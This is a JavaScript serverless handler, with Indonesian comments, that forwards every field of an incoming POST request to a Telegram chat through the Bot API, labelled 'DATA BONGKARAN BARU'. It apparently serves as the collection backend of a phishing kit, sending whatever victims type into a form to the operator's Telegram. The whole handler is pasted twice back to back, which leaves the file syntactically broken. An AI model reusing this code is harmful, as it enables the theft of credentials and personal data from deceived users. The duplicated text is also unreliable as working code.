export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  try {
    const data = req.body;

    // Membuat format pesan untuk Telegram
    let text = "📥 *DATA BONGKARAN BARU*\n\n";
    for (const k in data) {
      // Menghindari pengiriman data kosong atau file (jika ada)
      if (typeof data[k] !== 'object') {
        text += `*${k.toUpperCase().replace(/_/g, ' ')}* : ${data[k]}\n`;
      }
    }

    const telegramURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const tgRes = await fetch(telegramURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: text,
        parse_mode: "Markdown" // Agar tampilan di Telegram lebih rapi (bold)
      })
    });

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      throw new Error(tgData.description);
    }

    return res.status(200).json({ status: "success" });

  } catch (err) {
    console.error("SERVER ERROR:", err);
    return res.status(500).json({ status: "error", message: err.message });
  }
}export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  try {
    const data = req.body;

    // Membuat format pesan untuk Telegram
    let text = "📥 *DATA BONGKARAN BARU*\n\n";
    for (const k in data) {
      // Menghindari pengiriman data kosong atau file (jika ada)
      if (typeof data[k] !== 'object') {
        text += `*${k.toUpperCase().replace(/_/g, ' ')}* : ${data[k]}\n`;
      }
    }

    const telegramURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const tgRes = await fetch(telegramURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: text,
        parse_mode: "Markdown" // Agar tampilan di Telegram lebih rapi (bold)
      })
    });

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      throw new Error(tgData.description);
    }

    return res.status(200).json({ status: "success" });

  } catch (err) {
    console.error("SERVER ERROR:", err);
    return res.status(500).json({ status: "error", message: err.message });
  }
}
